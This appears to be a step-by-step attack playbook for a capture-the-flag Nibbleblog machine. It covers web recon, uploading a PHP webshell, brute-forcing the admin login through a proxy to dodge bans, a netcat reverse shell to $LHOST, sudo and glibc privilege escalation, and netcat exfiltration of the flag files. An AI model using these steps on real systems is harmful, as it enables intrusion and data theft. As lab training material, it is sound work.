name: Discover Web Server Version
execution: whatweb $TARGET
nikto -h $TARGET
gobuster dir -u http://$TARGET -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

decision_points.then: note web server version and OS

follow_up: Search for exploits based on identified web server version and OS

name: Discover Web Application Version

indicators: web application version in source code
web application version in file path

execution: gobuster dir -u http://$TARGET/nibbleblog -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt
curl -s http://$TARGET/nibbleblog | grep -oP 'version \K[0-9.]+'
grep -r 'version = "[0-9.]+"' /var/www/html/nibbleblog/

decision_points.if: web application specific version comment or file found

follow_up: Search for exploits based on identified web application version

name: Exploit Nibbleblog File Upload Vulnerability
execution: upload a webshell (e.g., cmd.php) via the my image plugin
access the webshell via http://$TARGET/content/private/my_image/cmd.php?cmd=whoami

name: Brute Force Nibbleblog Admin Login
execution: configure hydra with username 'admin', password list, login path '/nibbleblog/admin.php', and POST request with user/pass parameters
use a proxy to bypass IP-based brute-force protection if banned

decision_points.if: Nibbleblog admin login page is accessible

follow_up: Login to admin panel and exploit other vulnerabilities

name: Obtain Reverse Shell via PHP Webshell

indicators: Web server with PHP execution enabled

execution: upload a PHP reverse shell (e.g., cmd.php)
access the reverse shell URL with command execution parameters
start a netcat listener on $LHOST:$LPORT
execute the reverse shell payload from the webshell

decision_points.if: PHP webshell is uploaded and accessible
decision_points.then: attempt to obtain a reverse shell

name: Privilege Escalation via Sudo Configuration

indicators: User can run specific command as root without password
Sudo configuration allows execution of arbitrary commands via script

execution: create a script (e.g., monitor.sh) with a bash shell payload
make the script executable (chmod +x monitor.sh)
execute the script with sudo: sudo /path/to/monitor.sh

decision_points.if: sudo -l reveals a command executable by the user as root without a password
decision_points.then: leverage the sudo configuration for privilege escalation

name: Privilege Escalation via Glibc Exploit (Rational Love)
execution: compile the Rational Love exploit (GCC -o exploit exploit.c)
transfer the compiled exploit to the target machine
execute the exploit: ./exploit

decision_points.if: target system has vulnerable Glibc version
decision_points.then: compile and execute the Glibc exploit

name: Exfiltrate User Flag

indicators: user.txt file found in home directory

execution: cat /home/$USER/user.txt
send the content of user.txt to $LHOST:$LPORT using netcat

name: Exfiltrate Root Flag

indicators: root.txt file found in root directory

execution: cat /root/root.txt
send the content of root.txt to $LHOST:$LPORT using netcat
